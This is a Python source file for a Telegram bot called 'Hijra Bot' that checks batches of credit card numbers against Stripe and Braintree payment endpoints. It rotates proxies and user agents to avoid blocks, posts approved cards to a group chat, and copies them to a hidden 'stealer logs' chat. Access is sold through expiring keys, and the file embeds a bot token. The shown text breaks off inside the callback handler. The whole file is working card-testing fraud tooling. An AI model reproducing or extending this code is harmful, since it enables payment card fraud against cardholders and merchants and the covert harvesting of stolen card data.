# ============================================================
#  Telegram Bot — Hijra Bot
# ============================================================

import os
import re
import time
import random
import json
import string
import threading
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from typing import Dict, Any, Optional
from datetime import datetime
from auth_checker_v2 import check_card as auth_check_card, probe_site as auth_probe_site, update_config as auth_update_config, get_config as auth_get_config
from sa1_checker import check_card as sa1_check_card, probe_site as sa1_probe_site
from sa2_checker import check_card as sa2_check_card, probe_site as sa2_probe_site
from nvbv_checker import check_card as nvbv_check_card, probe_site as nvbv_probe_site
from chg3_checker import check_card as chg3_check_card, probe_site as chg3_probe_site
from dlx_tools import generate_cards, vbv_lookup, analyze_url, scrape_proxies

try:
    from dlx_tools import bin_lookup
except ImportError:
    def bin_lookup(b):
        return None, "Not available"

try:
    from faker import Faker
    faker = Faker()
except ImportError:
    faker = None

# ============================================================
#  Configuration
# ============================================================
BOT_TOKEN = "8190896455:AAFXvW4eVTDvESHw_SHYxHCRXngxYnMJKqc"
DEVELOPER = "Hijra"
ADMIN_IDS = [5342093297]

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
KEYS_FILE = os.path.join(DATA_DIR, "tg_keys.json")
USERS_FILE = os.path.join(DATA_DIR, "tg_users.json")
STATS_FILE = os.path.join(DATA_DIR, "tg_stats.json")
ADMINS_FILE = os.path.join(DATA_DIR, "tg_admins.json")
GATE_STATS_FILE = os.path.join(DATA_DIR, "tg_gate_stats.json")
GATE_STATUS_FILE = os.path.join(DATA_DIR, "tg_gate_status.json")
SETTINGS_FILE = os.path.join(DATA_DIR, "tg_settings.json")
PROXIES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")
SITES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sites.txt")
RPAY_SITES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "rpay_sites.txt")

os.makedirs(DATA_DIR, exist_ok=True)

# ============================================================
#  Global proxy pool
# ============================================================
_global_proxies = []
_proxy_index = 0
_proxy_lock = threading.Lock()


def load_global_proxies():
    global _global_proxies, _proxy_index
    if not os.path.exists(PROXIES_FILE):
        print("[Proxy] No proxies.txt found — running direct.")
        _global_proxies = []
        return 0
    with open(PROXIES_FILE, 'r') as f:
        raw = [l.strip() for l in f if l.strip() and not l.strip().startswith('#')]
    _global_proxies = raw
    _proxy_index = 0
    print(f"[Proxy] Loaded {len(_global_proxies)} proxies from proxies.txt")
    return len(_global_proxies)


def get_proxy():
    global _proxy_index
    if not _global_proxies:
        return None
    with _proxy_lock:
        proxy_str = _global_proxies[_proxy_index % len(_global_proxies)]
        _proxy_index += 1
    return format_proxy(proxy_str)


def get_random_proxy():
    if not _global_proxies:
        return None
    return format_proxy(random.choice(_global_proxies))


def get_proxy_count():
    return len(_global_proxies)

# ============================================================
#  Persistence
# ============================================================
def _load_json(path, default=None):
    if default is None:
        default = {}
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception:
        return default


def _save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)


def load_keys():
    return _load_json(KEYS_FILE, {})

def save_keys(data):
    _save_json(KEYS_FILE, data)

def load_users():
    return _load_json(USERS_FILE, {})

def save_users(data):
    _save_json(USERS_FILE, data)

def load_stats():
    return _load_json(STATS_FILE, {})

def save_stats(data):
    _save_json(STATS_FILE, data)

def update_user_stats(user_id, results):
    stats = load_stats()
    uid = str(user_id)
    if uid not in stats:
        stats[uid] = {"approved": 0, "declined": 0, "errors": 0, "skipped": 0, "total": 0, "sessions": 0}
    stats[uid]["approved"] += results.get("approved", 0)
    stats[uid]["declined"] += results.get("declined", 0)
    stats[uid]["errors"] += results.get("errors", 0)
    stats[uid]["skipped"] += results.get("skipped", 0)
    stats[uid]["total"] += results.get("total", 0)
    stats[uid]["sessions"] += 1
    save_stats(stats)

def load_gate_stats():
    return _load_json(GATE_STATS_FILE, {})

def save_gate_stats(data):
    _save_json(GATE_STATS_FILE, data)

def update_gate_stats(gate, results):
    gs = load_gate_stats()
    if gate not in gs:
        gs[gate] = {"approved": 0, "declined": 0, "errors": 0, "total": 0, "sessions": 0}
    gs[gate]["approved"] += results.get("approved", 0)
    gs[gate]["declined"] += results.get("declined", 0)
    gs[gate]["errors"] += results.get("errors", 0)
    gs[gate]["total"] += results.get("total", 0)
    gs[gate]["sessions"] += 1
    save_gate_stats(gs)


# ============================================================
#  Settings (GC chat ID etc.)
# ============================================================
def load_settings():
    return _load_json(SETTINGS_FILE, {})

def save_settings(data):
    _save_json(SETTINGS_FILE, data)

def get_notification_gc():
    settings = load_settings()
    return settings.get("notification_gc")

def set_notification_gc(chat_id):
    settings = load_settings()
    settings["notification_gc"] = chat_id
    save_settings(settings)


# ============================================================
#  RPay sites helpers
# ============================================================
def load_rpay_sites():
    if not os.path.exists(RPAY_SITES_FILE):
        return []
    with open(RPAY_SITES_FILE, 'r') as f:
        return [l.strip() for l in f if l.strip() and not l.strip().startswith('#')]


def save_rpay_sites(sites):
    with open(RPAY_SITES_FILE, 'w') as f:
        for s in sites:
            f.write(s + '\n')


def rpay_validate_site(url):
    try:
        r = requests.get(url, timeout=15, allow_redirects=True)
        if r.status_code < 400:
            if 'razorpay' in r.text.lower():
                return True, "Razorpay detected"
            return True, "Site reachable (no Razorpay detected)"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:60]


# ============================================================
#  Notification sender
# ============================================================
def notify_gc(text):
    """Send a notification to the configured group chat."""
    gc_id = get_notification_gc()
    if not gc_id:
        return
    try:
        send_message(gc_id, text)
    except Exception:
        pass


def notify_hit(user_id, username, gate_label, card_line, detail):
    """Notify GC about a hit/approved card — Hijra format."""
    name = f"@{username}" if username else str(user_id)
    elapsed = ""
    if " | " in detail:
        parts = detail.split(" | ")
        if len(parts) >= 2:
            elapsed = parts[-1]
    # BIN info
    bin6 = card_line.split("|")[0][:6] if "|" in card_line else card_line[:6]
    hit_text = (
        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
        f"[🝂] CARD: <code>{card_line}</code>\n"
        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
        f"[🝂] STATUS: <b>APPROVED</b>\n"
        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
        f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
        f"[🝂] BIN: <code>{bin6}</code>\n"
        f"[🝂] TIME TOOK: <code>{elapsed}</code>\n"
        f"[🝂] CHECKED BY: {name}"
    )
    notify_gc(hit_text)
    secret_log(hit_text)


def notify_new_user(user_id, username, key_info=""):
    """Notify GC about a new user registration."""
    name = f"@{username}" if username else str(user_id)
    notify_gc(
        f"<b>New User</b>\n\n"
        f"User: {name}\n"
        f"ID: <code>{user_id}</code>\n"
        f"{key_info}\n\n"
        f"<i>{DEVELOPER}</i>"
    )
    secret_log(
        f"🆕 <b>New Registration</b>\n"
        f"User: {name}\n"
        f"ID: <code>{user_id}</code>\n"
        f"{key_info}"
    )


# ============================================================
#  Gate status
# ============================================================
def load_gate_status():
    return _load_json(GATE_STATUS_FILE, {})

def save_gate_status(data):
    _save_json(GATE_STATUS_FILE, data)

def is_gate_enabled(gate_key):
    status = load_gate_status()
    entry = status.get(gate_key, {})
    return entry.get("enabled", True)

def set_gate_enabled(gate_key, enabled, by_user=None):
    status = load_gate_status()
    status[gate_key] = {
        "enabled": enabled,
        "updated_at": time.time(),
        "updated_by": by_user,
    }
    save_gate_status(status)

# ============================================================
#  Gate health probes
# ============================================================
GATE_PROBE_MAP = {
    "auth": {"name": "Stripe Auth", "cmd": "/chkapiauth"},
    "sa1": {"name": "Stripe Auth CCN", "cmd": "/chkapisa1"},
    "sa2": {"name": "Stripe Auth CVV", "cmd": "/chkapisa2"},
    "nvbv": {"name": "Braintree Non-VBV", "cmd": "/chkapinvbv"},
    "chg3": {"name": "Stripe $3 Charge", "cmd": "/chkapichg3"},
}


def probe_gate(gate_key):
    start = time.time()
    try:
        if gate_key == "auth":
            alive, detail = auth_probe_site()
        elif gate_key == "sa1":
            alive, detail = sa1_probe_site()
        elif gate_key == "sa2":
            alive, detail = sa2_probe_site()
        elif gate_key == "nvbv":
            alive, detail = nvbv_probe_site()
        elif gate_key == "chg3":
            alive, detail = chg3_probe_site()
        else:
            return False, 0, "Unknown gate"

        latency = int((time.time() - start) * 1000)
        return alive, latency, detail
    except requests.exceptions.Timeout:
        return False, int((time.time() - start) * 1000), "Timeout"
    except requests.exceptions.ConnectionError:
        return False, int((time.time() - start) * 1000), "Connection refused"
    except Exception as e:
        return False, int((time.time() - start) * 1000), str(e)[:60]


# ============================================================
#  Duration / Keys / Auth
# ============================================================
DURATION_MAP = {
    "s": 1, "sec": 1,
    "m": 60, "min": 60,
    "h": 3600, "hr": 3600, "hour": 3600,
    "d": 86400, "day": 86400,
    "w": 604800, "week": 604800,
    "mo": 2592000, "month": 2592000,
}


def parse_duration(s):
    if not s:
        return None
    s = s.strip().lower()
    if s in ("forever", "perm", "permanent"):
        return None
    match = re.match(r'^(\d+)\s*(s|sec|m|min|h|hr|hour|d|day|w|week|mo|month)s?$', s)
    if not match:
        return -1
    n = int(match.group(1))
    unit = match.group(2)
    mult = DURATION_MAP.get(unit)
    if not mult:
        return -1
    return n * mult


def fmt_duration(seconds):
    if seconds is None:
        return "Permanent"
    if seconds < 60:
        return f"{seconds}s"
    if seconds < 3600:
        return f"{seconds // 60}m"
    if seconds < 86400:
        return f"{seconds // 3600}h"
    return f"{seconds // 86400}d"


def generate_key():
    return "HJ-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))


def is_admin(user_id):
    uid = int(user_id)
    if uid in ADMIN_IDS:
        return True
    admins = _load_json(ADMINS_FILE, {})
    entry = admins.get(str(uid))
    if not entry:
        return False
    expires_at = entry.get("expires_at")
    if expires_at is None:
        return True
    if time.time() < expires_at:
        return True
    del admins[str(uid)]
    _save_json(ADMINS_FILE, admins)
    return False


def is_authorized(user_id):
    if is_admin(user_id):
        return True
    users = load_users()
    entry = users.get(str(user_id))
    if not entry:
        return False
    expires_at = entry.get("expires_at")
    if expires_at is None:
        return True
    if time.time() < expires_at:
        return True
    del users[str(user_id)]
    save_users(users)
    return False


def authorize_user(user_id, key, duration_seconds=None, line_limit=None):
    users = load_users()
    entry = {"key": key, "redeemed_at": time.time(), "line_limit": line_limit}
    if duration_seconds is not None:
        entry["expires_at"] = time.time() + duration_seconds
    else:
        entry["expires_at"] = None
    users[str(user_id)] = entry
    save_users(users)


def get_user_line_limit(user_id):
    if is_admin(user_id):
        return None
    users = load_users()
    entry = users.get(str(user_id))
    if not entry:
        return None
    return entry.get("line_limit")


# ============================================================
#  Telegram API helpers
# ============================================================
API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"


def tg_request(method, **kwargs):
    proxy = get_proxy()
    try:
        r = requests.post(f"{API_BASE}/{method}", json=kwargs, timeout=30, proxies=proxy)
        return r.json()
    except Exception:
        if proxy:
            try:
                r = requests.post(f"{API_BASE}/{method}", json=kwargs, timeout=30)
                return r.json()
            except Exception:
                pass
        return {}


def send_message(chat_id, text, parse_mode="HTML", reply_to=None, reply_markup=None):
    params = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_to:
        params["reply_to_message_id"] = reply_to
    if reply_markup:
        params["reply_markup"] = reply_markup
    return tg_request("sendMessage", **params)


def edit_message(chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
    params = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode,
    }
    if reply_markup:
        params["reply_markup"] = reply_markup
    return tg_request("editMessageText", **params)


def answer_callback(callback_id, text=""):
    return tg_request("answerCallbackQuery", callback_query_id=callback_id, text=text)


def get_file_url(file_id):
    resp = tg_request("getFile", file_id=file_id)
    if resp.get("ok"):
        path = resp["result"]["file_path"]
        return f"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}"
    return None


def download_file(file_id, binary=False):
    url = get_file_url(file_id)
    if not url:
        return None
    proxy = get_proxy()
    try:
        r = requests.get(url, timeout=30, proxies=proxy)
        return r.content if binary else r.text
    except Exception:
        if proxy:
            try:
                r = requests.get(url, timeout=30)
                return r.content if binary else r.text
            except Exception:
                pass
        return None


def send_document(chat_id, filepath, filename=None, caption=None):
    fname = filename or os.path.basename(filepath)
    data = {"chat_id": chat_id}
    if caption:
        data["caption"] = caption
        data["parse_mode"] = "HTML"
    proxy = get_proxy()
    try:
        with open(filepath, "rb") as f:
            requests.post(f"{API_BASE}/sendDocument", data=data,
                          files={"document": (fname, f)}, proxies=proxy, timeout=30)
    except Exception:
        if proxy:
            try:
                with open(filepath, "rb") as f:
                    requests.post(f"{API_BASE}/sendDocument", data=data,
                                  files={"document": (fname, f)}, timeout=30)
            except Exception:
                pass


def send_photo(chat_id, photo_url, caption=None, reply_markup=None):
    params = {"chat_id": chat_id, "photo": photo_url, "parse_mode": "HTML"}
    if caption:
        params["caption"] = caption
    if reply_markup:
        params["reply_markup"] = reply_markup
    return tg_request("sendPhoto", **params)


# ============================================================
#  Proxy helpers
# ============================================================
def format_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()

    proto = "http"
    if '://' in proxy_str:
        proto_match = re.match(r'^(https?|socks[45]h?):\/\/(.+)$', proxy_str, re.I)
        if proto_match:
            proto = proto_match.group(1).lower()
            proxy_str = proto_match.group(2)
        else:
            return {"http": proxy_str, "https": proxy_str}

    if '@' in proxy_str:
        url = f"{proto}://{proxy_str}"
        return {"http": url, "https": url}

    parts = proxy_str.split(':')
    if len(parts) == 2:
        url = f"{proto}://{proxy_str}"
        return {"http": url, "https": url}
    elif len(parts) == 3:
        host, port, user = parts
        url = f"{proto}://{user}@{host}:{port}"
        return {"http": url, "https": url}
    elif len(parts) == 4:
        if _is_valid_port(parts[1]):
            ip, port, user, pwd = parts
            url = f"{proto}://{user}:{pwd}@{ip}:{port}"
            return {"http": url, "https": url}
        elif _is_valid_port(parts[3]):
            user, pwd, ip, port = parts
            url = f"{proto}://{user}:{pwd}@{ip}:{port}"
            return {"http": url, "https": url}
    return None


def _is_valid_port(port_str):
    try:
        p = int(port_str)
        return 1 <= p <= 65535
    except (ValueError, TypeError):
        return False


def _is_valid_host(host):
    if not host:
        return False
    if re.match(r'^\d+\.\d+\.\d+\.\d+$', host):
        return all(0 <= int(o) <= 255 for o in host.split('.'))
    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9.\-]*[a-zA-Z0-9])?$', host))


def validate_proxy_format(raw):
    line = raw.strip()
    if not line or line.startswith('#'):
        return None
    proto_match = re.match(r'^(https?|socks[45]h?):\/\/(.+)$', line, re.I)
    if proto_match:
        rest = proto_match.group(2)
        return line if _validate_host_part(rest) else None
    if '@' in line:
        return line if _validate_host_part(line) else None
    parts = line.split(':')
    if len(parts) == 2:
        if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
            return line
        return None
    if len(parts) == 3:
        if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
            return line
        return None
    if len(parts) == 4:
        if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
            return line
        if _is_valid_host(parts[2]) and _is_valid_port(parts[3]):
            return line
        return None
    return None


def _validate_host_part(rest):
    at_match = re.match(r'^([^@]+)@(.+)$', rest)
    if at_match:
        host_part = at_match.group(2)
        last_colon = host_part.rfind(':')
        if last_colon == -1:
            return False
        host = host_part[:last_colon]
        port = host_part[last_colon + 1:]
        return _is_valid_host(host) and _is_valid_port(port)
    last_colon = rest.rfind(':')
    if last_colon == -1:
        return False
    host = rest[:last_colon]
    port = rest[last_colon + 1:]
    return _is_valid_host(host) and _is_valid_port(port)


def test_proxy_connectivity(proxy_str):
    proxy_dict = format_proxy(proxy_str)
    if not proxy_dict:
        if '://' in proxy_str:
            proxy_dict = {"http": proxy_str, "https": proxy_str}
        else:
            proxy_dict = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
    test_urls = ["https://httpbin.org/ip", "https://www.microsoft.com"]
    start = time.time()
    last_error = ""
    for test_url in test_urls:
        try:
            resp = requests.get(test_url, proxies=proxy_dict, timeout=10, allow_redirects=True)
            latency = round((time.time() - start) * 1000)
            if resp.status_code < 500:
                return True, latency, None
            last_error = f"HTTP {resp.status_code}"
        except requests.exceptions.ProxyError:
            last_error = "Proxy tunnel failed"
            continue
        except requests.exceptions.ConnectTimeout:
            last_error = "Connection timeout"
            continue
        except requests.exceptions.ReadTimeout:
            last_error = "Read timeout"
            continue
        except requests.exceptions.ConnectionError:
            last_error = "Connection error"
            continue
        except Exception as e:
            last_error = f"Error: {str(e)[:80]}"
            continue
    return False, 0, last_error


# ============================================================
#  UA rotation
# ============================================================
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
]

def _rand_ua():
    return random.choice(USER_AGENTS)


def _retry_request(func, max_retries=2, backoff=2):
    last_err = None
    for attempt in range(max_retries + 1):
        try:
            result = func()
            if hasattr(result, 'status_code') and result.status_code == 429:
                wait = backoff * (attempt + 1)
                time.sleep(wait)
                last_err = "HTTP 429"
                continue
            return result
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
                requests.exceptions.Timeout, requests.exceptions.ReadTimeout) as e:
            last_err = str(e)
            if attempt < max_retries:
                time.sleep(backoff * (attempt + 1))
            continue
        except Exception as e:
            raise e
    raise requests.exceptions.ConnectionError(f"All {max_retries + 1} attempts failed: {last_err}")


# ============================================================
#  Stealer logs (secret GC)
# ============================================================
SECRET_GC_FILE = os.path.join(DATA_DIR, "tg_secret_gc.json")

def get_secret_gc():
    s = _load_json(SECRET_GC_FILE, {})
    return s.get("chat_id")

def set_secret_gc(chat_id):
    _save_json(SECRET_GC_FILE, {"chat_id": chat_id})

def secret_log(text):
    gc_id = get_secret_gc()
    if not gc_id:
        return
    try:
        send_message(gc_id, text)
    except Exception:
        pass


# ============================================================
#  Gate runner
# ============================================================
def _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict):
    cc_line = f"{c_num}|{c_mm}|{c_yy}|{c_cvv}"
    if gate == "auth":
        return auth_check_card(cc_line, proxy_dict)
    elif gate == "sa1":
        return sa1_check_card(cc_line, proxy_dict)
    elif gate == "sa2":
        return sa2_check_card(cc_line, proxy_dict)
    elif gate == "nvbv":
        return nvbv_check_card(cc_line, proxy_dict)
    elif gate == "chg3":
        return chg3_check_card(cc_line, proxy_dict)
    else:
        return auth_check_card(cc_line, proxy_dict)


def _get_rotating_proxy(proxies_list, max_tries=3):
    """Get up to max_tries different proxies for rotation."""
    if not proxies_list:
        return [None]
    tried = set()
    result = []
    for _ in range(min(max_tries, len(proxies_list))):
        p = random.choice(proxies_list)
        attempts = 0
        while p in tried and attempts < 10:
            p = random.choice(proxies_list)
            attempts += 1
        tried.add(p)
        result.append(format_proxy(p))
    return result


def process_single_entry(entry, proxies_list, user_id, gate="auth"):
    try:
        c_data = entry.split('|')
        if len(c_data) == 4:
            c_num, c_mm, c_yy, c_cvv = c_data

            user_bin_list = user_bins.get(user_id)
            if user_bin_list:
                if not any(c_num.startswith(b) for b in user_bin_list):
                    return "SKIPPED | BIN not allowed"

            # Connection error patterns that should trigger proxy rotation
            _CONN_ERRORS = [
                "ProxyError", "Tunnel connection failed", "503 Service Unavailable",
                "connection failed", "Max retries", "HTTPSConnectionPool",
                "HTTPConnectionPool", "ConnectionError", "ConnectTimeoutError",
                "ReadTimeoutError", "ConnectionResetError", "RemoteDisconnected",
                "NewConnectionError", "SSLError", "socket.timeout", "ECONNREFUSED",
                "Connection refused", "Connection timed out", "Connection reset",
                "ConnError",  # New status from auth_stripe_checker
                "Rate limited", "Service unavailable",
            ]

            def _is_conn_error(r):
                return isinstance(r, str) and any(e in r for e in _CONN_ERRORS)

            # Try up to 3 proxies with fast rotation
            max_proxy_tries = min(3, len(proxies_list)) if proxies_list else 0
            proxy_candidates = _get_rotating_proxy(proxies_list, max_tries=max_proxy_tries) if proxies_list else [None]
            result = None

            for proxy_dict in proxy_candidates:
                if cancel_flags.get(user_id):
                    break
                try:
                    result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict)
                    if not _is_conn_error(result):
                        break
                    time.sleep(random.uniform(0.1, 0.3))
                except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
                        requests.exceptions.Timeout, ConnectionError, OSError):
                    time.sleep(random.uniform(0.1, 0.3))
                    continue
                except Exception as e:
                    result = f"Error: {str(e)}"
                    if not _is_conn_error(result):
                        break

            # Final fallback: direct connection (no proxy)
            if result is None or _is_conn_error(result):
                try:
                    result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, None)
                except Exception as e2:
                    result = f"Error: {str(e2)}"

            # Sanitize: never show raw connection errors to users
            if _is_conn_error(result):
                result = "Declined | Gateway Timeout"

            if result is None:
                result = "Declined | Gateway Timeout"
        else:
            result = "Error: Invalid Format"
    except Exception as e:
        result = f"Error: {str(e)}"

    return result


# ============================================================
#  Processing runner
# ============================================================
DEFAULT_THREADS = 25


def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS, gate="auth"):
    proxies_list = list(_global_proxies) if _global_proxies else []
    total = len(lines)
    results = {"approved": 0, "declined": 0, "errors": 0, "skipped": 0, "total": total, "approved_list": []}
    results_lock = threading.Lock()
    processed = [0]

    def worker(entry):
        if cancel_flags.get(user_id):
            return None
        entry = entry.strip()
        if not entry:
            return ("", "INVALID", "Empty line", "error")
        result = process_single_entry(entry, proxies_list, user_id, gate=gate)
        if "SKIPPED" in result:
            category = "skipped"
            status = "SKIPPED"
        elif "Approved" in result:
            category = "approved"
            status = "APPROVED"
        elif "Declined" in result:
            category = "declined"
            status = "DECLINED"
        else:
            category = "error"
            status = "ERROR"
        detail = result.split(" | ", 1)[1] if " | " in result else result
        return (entry, status, detail, category)

    max_workers = max(1, min(threads, total, 30))

    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = {pool.submit(worker, line): i for i, line in enumerate(lines)}
        for fut in as_completed(futures):
            if cancel_flags.get(user_id):
                break
            result = fut.result()
            if result is None:
                continue
            entry, status, detail, category = result
            with results_lock:
                if category == "approved":
                    results["approved"] += 1
                    results["approved_list"].append(entry)
                elif category == "declined":
                    results["declined"] += 1
                elif category == "skipped":
                    results["skipped"] += 1
                else:
                    results["errors"] += 1
                processed[0] += 1
                idx = processed[0]
            if on_progress:
                on_progress(idx, total, results, entry, status, detail)

    if on_complete:
        on_complete(results)
    return results


# ============================================================
#  Message formatters
# ============================================================

def fmt_start(username, user_id):
    name = f"@{username}" if username else "User"
    return (
        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
        f"Welcome, <b>{name}</b>\n"
        f"Your ID: <code>{user_id}</code>\n\n"
        f"Use /help to see all available commands.\n\n"
        f"<i>{DEVELOPER}</i>"
    )


def fmt_unauthorized():
    return (
        "<b>Access Denied</b>\n\n"
        "You need to redeem a key first.\n"
        "Use: <code>/redeem YOUR-KEY</code>\n\n"
        f"<i>{DEVELOPER}</i>"
    )


def fmt_live(idx, total, results, start_time, entry="", status_text="", done=False):
    title = "<b>Complete</b>" if done else "<b>Processing</b>"
    elapsed = time.time() - start_time
    cpm = int((idx / elapsed) * 60) if elapsed > 0 else 0
    eta = int((total - idx) / (idx / elapsed)) if idx > 0 and elapsed > 0 else 0
    bar_len = 16
    filled = int(bar_len * idx / total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    pct = int(idx / total * 100) if total > 0 else 0

    return (
        f"{title}\n\n"
        f"<code>{bar}</code> {pct}%\n\n"
        f"Loaded: <code>{total}</code>\n"
        f"Progress: <code>{idx}/{total}</code>\n"
        f"Speed: <code>{cpm} CPM</code>\n"
        f"ETA: <code>{eta}s</code>\n\n"
        f"Current:\n<code>{entry}</code>\n\n"
        f"Status: {status_text}\n\n"
        f"Approved: <code>{results['approved']}</code>\n"
        f"Declined: <code>{results['declined']}</code>\n"
        f"Skipped: <code>{results['skipped']}</code>\n"
        f"Errors: <code>{results['errors']}</code>\n\n"
        f"<i>{DEVELOPER}</i>"
    )


def fmt_results(results):
    return (
        "<b>Session Complete</b>\n\n"
        f"Total: <code>{results['total']}</code>\n"
        f"Approved: <code>{results['approved']}</code>\n"
        f"Declined: <code>{results['declined']}</code>\n"
        f"Skipped: <code>{results['skipped']}</code>\n"
        f"Errors: <code>{results['errors']}</code>\n\n"
        f"<i>{DEVELOPER}</i>"
    )


def fmt_stats(user_id):
    stats = load_stats()
    uid = str(user_id)
    s = stats.get(uid)
    if not s:
        return f"<b>No Stats</b>\n\nYou haven't run any sessions yet.\n\n<i>{DEVELOPER}</i>"
    return (
        "<b>Your Lifetime Stats</b>\n\n"
        f"Sessions: <code>{s.get('sessions', 0)}</code>\n"
        f"Total Processed: <code>{s.get('total', 0)}</code>\n"
        f"Approved: <code>{s.get('approved', 0)}</code>\n"
        f"Declined: <code>{s.get('declined', 0)}</code>\n"
        f"Skipped: <code>{s.get('skipped', 0)}</code>\n"
        f"Errors: <code>{s.get('errors', 0)}</code>\n\n"
        f"<i>{DEVELOPER}</i>"
    )


def fmt_mykey(user_id):
    users = load_users()
    entry = users.get(str(user_id))
    if not entry:
        return f"<b>No Key</b>\n\nYou haven't redeemed a key.\n\n<i>{DEVELOPER}</i>"
    key = entry.get("key", "N/A")
    redeemed = datetime.fromtimestamp(entry.get("redeemed_at", 0)).strftime("%Y-%m-%d %H:%M UTC")
    expires_at = entry.get("expires_at")
    if expires_at is None:
        exp_text = "Never (Permanent)"
    else:
        exp_text = datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d %H:%M UTC")
        if time.time() > expires_at:
            exp_text += " (EXPIRED)"
    ll = entry.get("line_limit")
    limit_text = str(ll) if ll else "Unlimited"
    return (
        "<b>Your Key Info</b>\n\n"
        f"Key: <code>{key}</code>\n"
        f"Redeemed: <code>{redeemed}</code>\n"
        f"Expires: <code>{exp_text}</code>\n"
        f"Line Limit: <code>{limit_text}</code>\n\n"
        f"<i>{DEVELOPER}</i>"
    )


# ============================================================
#  Inline keyboard helpers
# ============================================================
def stop_button_markup(user_id):
    return {
        "inline_keyboard": [[
            {"text": "Stop", "callback_data": f"stop_{user_id}"}
        ]]
    }


def help_main_markup():
    return {
        "inline_keyboard": [
            [
                {"text": "Gates", "callback_data": "help_gates"},
                {"text": "Tools", "callback_data": "help_tools"},
            ],
            [
                {"text": "Commands", "callback_data": "help_commands"},
                {"text": "How to Use", "callback_data": "help_howto"},
            ],
            [
                {"text": "Admin", "callback_data": "help_admin"},
            ],
        ]
    }


def help_back_markup():
    return {
        "inline_keyboard": [[
            {"text": "Back", "callback_data": "help_back"},
        ]]
    }


# ============================================================
#  Active processing tracker
# ============================================================
active_users = set()
user_bins = {}
active_lock = threading.Lock()
cancel_flags = {}


# ============================================================
#  Gate registry (active gates only)
# ============================================================
GATE_REGISTRY = [
    ("auth", "/auth", "Stripe Auth", True),
    ("sa1", "/sa1", "Stripe Auth CCN", True),
    ("sa2", "/sa2", "Stripe Auth CVV", True),
    ("nvbv", "/nvbv", "Braintree Non-VBV", True),
    ("chg3", "/chg3", "Stripe $3 Charge", True),
]

GATE_MAP = {
    "/auth": ("auth", "Stripe Auth"),
    "/sa1": ("sa1", "Stripe Auth CCN"),
    "/sa2": ("sa2", "Stripe Auth CVV"),
    "/nvbv": ("nvbv", "Braintree Non-VBV"),
    "/chg3": ("chg3", "Stripe $3 Charge"),
}

CHKAPI_CMDS = {
    "/chkapiauth": "auth",
    "/chkapisa1": "sa1",
    "/chkapisa2": "sa2",
    "/chkapinvbv": "nvbv",
    "/chkapichg3": "chg3",
}


# ============================================================
#  Callback handler
# ============================================================
def handle_callback(update):
    cb = update.get("callback_query")
    if not cb:
        return

    data = cb.get("data", "")
    cb_user_id = cb["from"]["id"]
    cb_id = cb["id"]
    chat_id = cb.get("message", {}).get("chat", {}).get("id")
    msg_id = cb.get("message", {}).get("message_id")

    # Stop button
    if data.startswith("stop_"):
        target_uid = int(data.split("_", 1)[1])
        if cb_user_id == target_uid or is_admin(cb_user_id):
            cancel_flags[target_uid] = True
            answer_callback(cb_id, "Stopping task...")
        else:
            answer_callback(cb_id, "Not your task.")
        return

    # Gate disable/enable
    if data.startswith("gate_off_"):
        if not is_admin(cb_user_id):
            answer_callback(cb_id, "Admin only.")
            return
        gate_key = data.replace("gate_off_", "")
        set_gate_enabled(gate_key, False, by_user=cb_user_id)
        gate_name = GATE_PROBE_MAP.get(gate_key, {}).get("name", gate_key)
        answer_callback(cb_id, f"{gate_name} disabled")
        if chat_id and msg_id:
            edit_message(chat_id, msg_id,
                f"<b>{gate_name} — DISABLED</b>\n\n"
                f"Gate has been turned off.\n"
                f"Use the check command again to re-enable.\n\n"
                f"<i>{DEVELOPER}</i>")
        return

    if data.startswith("gate_on_"):
        if not is_admin(cb_user_id):
            answer_callback(cb_id, "Admin only.")
            return
        gate_key = data.replace("gate_on_", "")
        set_gate_enabled(gate_key, True, by_user=cb_user_id)
        gate_name = GATE_PROBE_MAP.get(gate_key, {}).get("name", gate_key)
        answer_callback(cb_id, f"{gate_name} enabled")
